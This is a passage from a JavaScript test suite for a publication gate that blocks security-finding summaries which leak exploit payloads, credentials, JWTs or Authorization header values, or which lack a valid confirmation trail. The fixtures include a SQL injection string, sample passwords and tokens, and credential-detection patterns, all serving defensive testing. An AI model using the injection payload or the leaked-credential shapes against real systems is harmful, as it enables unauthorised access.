    assert.strictEqual(PAYLOAD_PATTERNS.length, Object.keys(payloads).length,
      "every declared payload pattern needs a negative test");
  });

  test("a declared exploitPayload blocks at ANY length, command-shaped or not", () => {
    const result = exportOf(securityFinding({
      exploitPayload: "admin",
      publicSummary: "Supplying the username admin bypasses the check entirely.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /contains exploitPayload verbatim/);
  });

  test("prose that merely mentions a traversal without spelling it stays exportable", () => {
    const result = exportOf(securityFinding({
      publicSummary: "The endpoint does not reject parent-directory segments in the path parameter.",
    }));
    assert.strictEqual(result.allowed, true);
  });

  test("a finding that never cleared the evidence gate cannot become a public claim", () => {
    for (const status of ["Candidate", "Rejected"]) {
      const result = exportOf(securityFinding({ status }));
      assert.strictEqual(result.allowed, false, `${status} must not export`);
      assert.strictEqual(result.decision, "invalid");
      assert.match(result.errors.join("\n"), /must not become a public claim/);
    }
  });

  test("a missing or unrecognized status fails closed at the export gate", () => {
    for (const status of [undefined, "", "Triaged", {}]) {
      assert.strictEqual(exportOf(securityFinding({ status })).allowed, false,
        `status ${JSON.stringify(status)} must not export`);
    }
  });

  test("exportable statuses are DERIVED from the graph — Confirmed and everything downstream", () => {
    assert.deepStrictEqual([...EXPORTABLE_STATUSES].sort(), [
      "AcceptedRisk", "Confirmed", "DocumentationOnly", "Duplicate",
      "Fixed", "IssueFiled", "Planned", "Reopened",
    ]);
    assert.ok(!EXPORTABLE_STATUSES.includes("Candidate"));
    assert.ok(!EXPORTABLE_STATUSES.includes("Rejected"));
  });

  test("a typo in an intended private classification fails closed at EVERY severity", () => {
    // The bypass this replaces: validation ran only for high/critical, so a
    // low-severity `"privat"` was ignored and fell through to the public
    // default — the misspelling authorized exactly what it was meant to stop.
    for (const severity of SCHEMA.SEVERITIES) {
      const result = exportOf(securityFinding({
        severity,
        disclosure: { classification: "privat", decidedBy: "lkikov", date: "2026-08-22" },
      }));
      assert.strictEqual(result.allowed, false, `severity ${severity} must fail closed`);
      assert.match(result.errors.join("\n"), /must be one of public\/private\/embargoed/);
    }
  });

  test("a low-severity finding's explicit private classification is honored, not defaulted away", () => {
    const result = exportOf(securityFinding({
      severity: "low",
      disclosure: { classification: "private", decidedBy: "lkikov", date: "2026-08-22" },
    }));
    assert.strictEqual(result.allowed, false);
    assert.strictEqual(result.decision, "export-blocked");
  });

  test("an incomplete disclosure record on a LOW-severity finding is still validated", () => {
    const result = exportOf(securityFinding({
      severity: "medium",
      disclosure: { classification: "private" },
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.errors.join("\n"), /disclosure is missing required field: decidedBy/);
  });

  test("a disclosure field that is not a record object is refused, not ignored", () => {
    for (const disclosure of ["private", ["private"], 7]) {
      const result = exportOf(securityFinding({ severity: "low", disclosure }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(disclosure)} must be refused`);
      assert.match(result.errors.join("\n"), /is not a decision record object/);
    }
  });

  // ── review round 2 ────────────────────────────────────────────────────

  test("an exportable STATUS is not a journey — a record with no trail cannot be published", () => {
    // The bypass this replaces: `status: "Planned"` written onto a record that
    // never faced the evidence gate exported cleanly, because only graph
    // membership was checked.
    const result = exportOf(securityFinding({ history: undefined, triage: undefined }));
    assert.strictEqual(result.allowed, false);
    assert.strictEqual(result.decision, "invalid");
    assert.match(result.errors.join("\n"), /carries no status trail/);
  });

  test("a trail that never passes through Confirmed cannot be published", () => {
    const result = exportOf(securityFinding({
      status: "Fixed",
      history: [
        { from: "Planned", to: "Fixed", at: "2026-08-21T09:00:00Z" },
      ],
      triage: { outcome: "Planned", owner: "lkikov", date: "2026-08-21" },
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.errors.join("\n"), /no transition into Confirmed|status trail/);
  });

  test("a record past Confirmed whose triage does not hold up cannot be published", () => {
    const result = exportOf(securityFinding({
      triage: { outcome: "Planned", owner: "TBD", date: "2026-08-21" },
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.errors.join("\n"), /does not hold up/);
  });

  test("a Confirmed finding IS exportable — filing the issue is what makes the outcome", () => {
    const result = exportOf(securityFinding({
      status: "Confirmed",
      history: [{ from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" }],
      triage: undefined,
    }));
    assert.strictEqual(result.allowed, true);
  });

  // ── review round 3 ────────────────────────────────────────────────────

  test("a hand-written trail is not a record — mandatory finding fields are validated too", () => {
    // The bypass this replaces: two lines of syntactically valid history, a
    // severity, and a summary exported as a confirmed public claim, with no
    // violatedInvariant, no reproduction, and no evidence anywhere on the row.
    const forged = {
      id: "A05-F9", title: "something is wrong", severity: "critical", status: "Confirmed",
      history: [{ from: "Candidate", to: "Confirmed", at: "2026-08-20T10:00:00Z" }],
      disclosure: { classification: "public", decidedBy: "lkikov", date: "2026-08-22" },
      publicSummary: "A neutral description of a defect in the loader.",
    };
    const result = exportOf(forged);
    assert.strictEqual(result.allowed, false);
    assert.strictEqual(result.decision, "invalid");
    assert.match(result.errors.join("\n"), /a record missing its mandatory fields supports nothing/);
  });

  test("a record whose confirmation boxes are blank cannot be published", () => {
    // The bypass this replaces: the export gate ran schema.js's
    // validateFinding(), which tests PRESENCE, so a forged or corrupted row
    // with a clean Candidate -> Confirmed trail and whitespace in every box was
    // authorized as a public claim without ever meeting T6's evidence gate.
    for (const blank of ["   ", "\t", "\n"]) {
      const result = exportOf(securityFinding({
        violatedInvariant: blank, evidence: blank, impact: blank,
      }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(blank)} must block`);
      assert.strictEqual(result.decision, "invalid");
      assert.match(result.errors.join("\n"), /violatedInvariant must be a non-empty string/);
    }
  });

  test("§7's confirmation facts are required at publication, not only at confirmation", () => {
    // revision, variantsConsidered, duplicateSearch, model and tokens are
    // outside validateFinding()'s field list by design — a Candidate may lack
    // them. A record claiming to have been CONFIRMED may not, and publication
    // asserts exactly that claim.
    for (const field of ["revision", "variantsConsidered", "duplicateSearch", "model", "tokens"]) {
      const result = exportOf(securityFinding({ [field]: undefined }));
      assert.strictEqual(result.allowed, false, `a record with no ${field} must block`);
      assert.strictEqual(result.decision, "invalid");
      assert.match(result.errors.join("\n"), new RegExp(field));
    }
  });

  test("an anchor at line 0 or in an unnamed file cannot be published", () => {
    for (const anchor of [{ file: "lib/routes/paths.js", line: 0 }, { file: "  ", line: 12 }]) {
      const result = exportOf(securityFinding({ affectedPaths: [anchor] }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(anchor)} must block`);
      assert.strictEqual(result.decision, "invalid");
    }
  });

  test("an anchor the tree cannot confirm fails CLOSED — publication is not the place to guess", () => {
    const resolvers = {
      "the resolver could not answer at all": () => null,
      "the file is gone from the tree": () => ({ inTree: true, exists: false, lines: 0 }),
      "the anchor points outside the audited tree": () => ({ inTree: false, exists: false, lines: 0 }),
      "the line is past the end of the file": () => ({ inTree: true, exists: true, lines: 10 }),
    };
    for (const [why, anchorResolver] of Object.entries(resolvers)) {
      const result = checkPublicExport(securityFinding(), { anchorResolver });
      assert.strictEqual(result.allowed, false, `${why} must block`);
      assert.strictEqual(result.decision, "invalid");
      assert.match(result.errors.join("\n"), /publication asserts a finding in current code/);
    }
  });

  test("the anchor read is injectable — the default consults the real audited tree", () => {
    // The fixture anchors at lib/routes/paths.js, which is in this repository,
    // so the DEFAULT resolver clears it. A finding anchored at a file that is
    // not there does not export, with no resolver passed at all.
    assert.strictEqual(checkPublicExport(securityFinding()).allowed, true);

    const stale = checkPublicExport(securityFinding({
      affectedPaths: [{ file: "lib/routes/deleted-three-waves-ago.js", line: 12 }],
    }));
    assert.strictEqual(stale.allowed, false);
    assert.match(stale.errors.join("\n"), /names no file in the audited tree/);
  });

  test("an assigned credential blocks at ANY length and in any quoting", () => {
    // The bypass this replaces: a six-character floor on the value, so
    // `password=abc` and a quoted passphrase both scanned clean.
    const leaks = [
      "The config shipped with password=abc in it.",
      "It logged password=\"my secret pass\" on startup.",
      "The default is api_key='k1' for every install.",
      "The header carried auth=x and the check passed.",
    ];
    for (const publicSummary of leaks) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /never the credential/);
    }
  });

  test("a JWT copied out of a reproduction blocks even with its header left behind", () => {
    // The bypass this replaces: a summary quotes the TOKEN and drops the
    // `Authorization: Bearer` around it. One word is not a runnable command and
    // never reaches the eight-word run, so both source-comparison rules missed
    // it and no shape recognized the token on its own.
    const leaks = [
      "The session eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMifQ.dBjftJeZ4CVP-mB92K27u " +
        "was accepted after logout.",
      // alg:none — the signature is empty, which is usually the defect itself
      // and must not become the way the credential gets published.
      "The session eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjMifQ. was accepted.",
    ];
    for (const publicSummary of leaks) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /JWT/);
    }
  });

  test("but ordinary dotted prose is not a JWT", () => {
    // `eyJ` is the whole reason the shape is safe to match bare. Without that
    // anchor, every file path and version string in an honest summary would
    // read as a token.
    const clean = [
      "The route lib/routes/paths.js calls resolve.join.check and skips the guard.",
      "The bug appeared in v1.2.3 and in node.js 26.5.0 alike.",
    ];
    for (const publicSummary of clean) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must export: ${publicSummary} — ${result.blockedReasons.join("; ")}`);
    }
  });

  test("an Authorization header credential blocks at any scheme and any token length", () => {
    // The bypass this replaces: the assignment value stops at the first space,
    // so the scanner only ever saw `Basic`/`Bearer` — both METADATA_WORDS on
    // purpose — and the token AFTER the scheme, which is the actual credential,
    // was read by nothing. The standalone bearer shape has a sixteen-character
    // floor, so a short one cleared that too.
    const leaks = [
      "The log recorded Authorization: Basic dXNlcjpwYXNz on every request.",
      "The log recorded Authorization: Bearer abc on every request.",
      'The captured headers were {"Authorization": "Bearer abc"} in the dump.',
      "The log recorded Proxy-Authorization: Basic dXNlcjpwYXNz too.",
      "The log recorded Authorization: Nonstandard a1b2c3 on every request.",
      // A NUMERIC token. The metadata exemption that reads `tokens: 500` as a
      // count must not reach here: after a scheme, the value is the credential
      // by construction, so a number is a weak secret, not a tally.
      "The log recorded Authorization: Bearer 1234 on every request.",
      "The log recorded Authorization: Digest 42 on every request.",
      // No scheme at all: the whole value is the credential.
      "The log recorded Authorization: hunter2 on every request.",
    ];
    for (const publicSummary of leaks) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"),
        /Authorization credential|never the credential/, `wrong reason for: ${publicSummary}`);
    }
  });

  test("but describing the Authorization header, or redacting its value, still exports", () => {
    // The other half of the rule. A colon is ordinary punctuation, and a gate
    // that refuses an honest sentence about a header is a gate someone
    // switches off — which costs more than the leak it was guarding.
    const clean = [
      "The Authorization header is never checked by the route.",
      "The route reports auth: required but does not enforce it.",
      "Authorization: required is documented, yet the check is skipped.",
      "The log recorded Authorization: Bearer <redacted> on every request.",
      "The log recorded Authorization: none required for this route.",
    ];
    for (const publicSummary of clean) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must export: ${publicSummary} — ${result.blockedReasons.join("; ")}`);
    }
  });

  test("a credential blocks when the KEY is quoted too, which is what JSON is", () => {
    // The bypass this replaces: the colon had to follow a BARE identifier, so a
    // pasted JSON response — the most ordinary way a credential travels — never
    // matched, and a short generic value like "abc" matches no secret shape
    // either, so the summary exported clean.
    const leaks = [
      'The config endpoint returns {"password":"abc"} to any caller.',
      "The body came back as {'api_key': 'k1'} for every install.",
      'The header was recorded as "auth": "x" in the log.',
    ];
    for (const publicSummary of leaks) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /never the credential/);
    }
  });

  test("a credential under a compound key name blocks — that is how they are written", () => {
    // The bypass this replaces: the `\b` before the credential word could not
    // match after an underscore, so `client_secret=hunter2` — the ordinary
    // spelling in config and in code — scanned clean and published the value.
    const leaks = [
      "The export shipped with client_secret=hunter2 still in it.",
      "The config was loaded with db_password=hunter2 and the check passed.",
      "The header carried x-api-key: abcdef1234567890 on every request.",
      "The service reads APP_AUTH_TOKEN=abc at boot.",
      "It logged service.account.token='zz' on startup.",
    ];
    for (const publicSummary of leaks) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /never the credential/);
    }

    // The compound prefix must not turn ordinary prose into a leak: the word has
    // to END the key, so a longer word that merely starts with it is not one.
    for (const publicSummary of [
      "The report names secretariat=jane as the owning team.",
      "The default tokenizer=bpe is used for every model.",
    ]) {
      assert.strictEqual(exportOf(securityFinding({ publicSummary })).allowed, true,
        `must not block: ${publicSummary}`);
    }
  });

  test("ordinary token/auth metadata is not a credential — the summary still exports", () => {
    // The false positive this replaces: `token`, `auth`, and bare `pass` were
    // matched like `password`, so this repository's own vocabulary — every
    // finding carries a `tokens` accounting block, routes are described as
    // `auth: required`, checks report `pass: true` — made a sanitized summary
    // unpublishable. A gate that refuses honest text is a gate someone
    // switches off.
    for (const publicSummary of [
      "The slice used output_tokens=500 across the whole run.",
      "The record carries tokens: 500 for the whole run.",
      "The route is documented as auth: required for every caller.",
      "The check reports pass: true on both backends.",
      "The retry window is auth=30s by default.",
    ]) {
      assert.strictEqual(exportOf(securityFinding({ publicSummary })).allowed, true,
        `must not block: ${publicSummary}`);
    }
  });

  test("the same ambiguous keys still block when the value is a credential", () => {
    // The exemption is on the VALUE, never on the key: a count or a config word
    // is metadata, anything else under the same key is still the secret.
    for (const publicSummary of [
      "The service reads APP_AUTH_TOKEN=abc at boot.",
      "It logged access_token='zz' on startup.",
      "The header carried auth=x and the check passed.",
      "The refresh_token=hunter2 was written to the log.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /never the credential/);
    }

    // The metadata exemption belongs to the ambiguous keys alone. A numeric
    // password is a weak password, not a token count.
    assert.strictEqual(
      exportOf(securityFinding({ publicSummary: "The config shipped with password=1234 in it." })).allowed,
      false,
    );
  });

  test("a camelCase credential key blocks — that is how this repository spells them", () => {
    // The bypass this replaces: the key prefix only recognized separator-
    // delimited segments, so `client_secret=` blocked while `clientSecret=` —
    // the same key in every JavaScript file here — scanned clean and published
    // the value. The boundary in a camelCase key is a change of case, not a
    // separator.
    const leaks = [
      "The export shipped with clientSecret=hunter2 still in it.",
      "The config was loaded with dbPassword=hunter2 and the check passed.",
      "It logged accessToken='zz' on startup.",
      "The default apiKey=abcdef1234 ships with every install.",
      "The header carried clientPassphrase=abc on every request.",
      "The service reads APIKey=abc at boot.",
    ];
    for (const publicSummary of leaks) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /never the credential/);
    }
  });

  test("a camelCase hump is a real boundary — the ordinary sense of the word still exports", () => {
    // The case-SENSITIVE split is what keeps this side honest: `key` is a
    // credential in company (`apiKey`) and the ordinary word otherwise, and a
    // letter sequence that merely contains a credential word is not a key.
    for (const publicSummary of [
      "The cacheKey=rootDir is reused across calls.",
      "The sortKey=name orders the result set.",
      "The record carries outputTokens: 500 for the whole run.",
      "The report names secretariat=jane as the owning team.",
      "The default tokenizer=bpe is used for every model.",
      "The compass=north heading is stored verbatim.",
    ]) {
      assert.strictEqual(exportOf(securityFinding({ publicSummary })).allowed, true,
        `must not block: ${publicSummary}`);
    }
  });

  test("the short and glued spellings of a credential key block too", () => {
    // The bypass this replaces: the vocabulary knew `password` and the humped
    // `dbPassword`, but not the spellings the tools themselves use. `passwd` is
    // what /etc/passwd, the `passwd` command, and most config files call the
    // field, and `apikey` written as one lowercase run never reached a hump —
    // so each one published a live credential as ordinary prose.
    for (const publicSummary of [
      "The seeded account ships with passwd=hunter2 in the bundled config file.",
      "The connection string is assembled from dbpass=hunter2 read out of the image.",
      "The mobile build embeds apikey=abcdef1234567890 in its shipped bundle.",
      "The manifest carries clientsecret=abcdef1234567890 for the shared tenant.",
      "The debug route echoes userpass=hunter2 back to any unauthenticated caller.",
      "The env dump printed PASSWD=hunter2 into the daily log.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /never the credential/);
    }

    // The glued split needs a head that names WHOSE credential it is, which is
    // what keeps the English words that merely end in one out of the gate.
    for (const publicSummary of [
      "The compass=north heading is written to the record verbatim on every read.",
      "The bypass=manual flag is what the operator sets to skip the slow check.",
      "The monkey=loud label is kept for the fixture the parser was written against.",
    ]) {
      assert.strictEqual(exportOf(securityFinding({ publicSummary })).allowed, true,
        `must not block: ${publicSummary}`);
    }
  });

  test("an ordinary assignment does not swallow the credential inside it", () => {
    // `leaks:` matches as an assignment whose value is the whole
    // `password=hunter2` string, so consuming the outer match would consume the
    // leak with it. Both must still be found.
    const result = exportOf(securityFinding({
      publicSummary: "Two leaks: password=hunter2swordfish and clientSecret=abcdef1234567890.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.strictEqual(result.blockedReasons.length, 2);
  });

  test("a redacted value under a compound key still passes", () => {
    assert.strictEqual(
      exportOf(securityFinding({
        publicSummary: "The export shipped with client_secret=<redacted> still in it.",
      })).allowed,
      true,
    );
  });

  test("redaction markers still pass, quoted or bare, at any length", () => {
    for (const publicSummary of [
      "The config was loaded with password=<redacted> and the check still passed.",
      "The config was loaded with password=\"[MASKED]\" and the check still passed.",
      "The config was loaded with password='***' and the check still passed.",
    ]) {
      assert.strictEqual(exportOf(securityFinding({ publicSummary })).allowed, true,
        `should read as redacted: ${publicSummary}`);
    }
  });

  test("a tiny exploitPayload matches on word boundaries, not as a substring", () => {
    // The bypass this replaces, in the other direction: an exploitPayload of
    // "0" blocked every summary containing "500", making publication impossible
    // for a valid finding. A gate nobody can pass gets switched off.
    const safe = [
      ["0", "The endpoint returns 500."],
      ["a", "The parameter is validated against the allowlist."],
      ["id", "The identity of the caller is never re-checked."],
    ];
    for (const [exploitPayload, publicSummary] of safe) {
      assert.strictEqual(exportOf(securityFinding({ exploitPayload, publicSummary })).allowed,
        true, `payload ${JSON.stringify(exploitPayload)} must not block: ${publicSummary}`);
    }

    // The same payloads standing alone as their own token still block.
    const leaks = [
      ["0", "Passing 0 as the id returns every row."],
      ["id", "Passing id as the sort column injects it into the query."],
    ];
    for (const [exploitPayload, publicSummary] of leaks) {
      assert.strictEqual(exportOf(securityFinding({ exploitPayload, publicSummary })).allowed,
        false, `payload ${JSON.stringify(exploitPayload)} must block: ${publicSummary}`);
    }
  });

  test("a punctuated payload keeps substring matching — it cannot collide by accident", () => {
    const result = exportOf(securityFinding({
      exploitPayload: "' OR 1=1 --",
      publicSummary: "Supplying the name ' OR 1=1 -- returns every row in the table.",
    }));
    assert.strictEqual(result.allowed, false);
  });
});
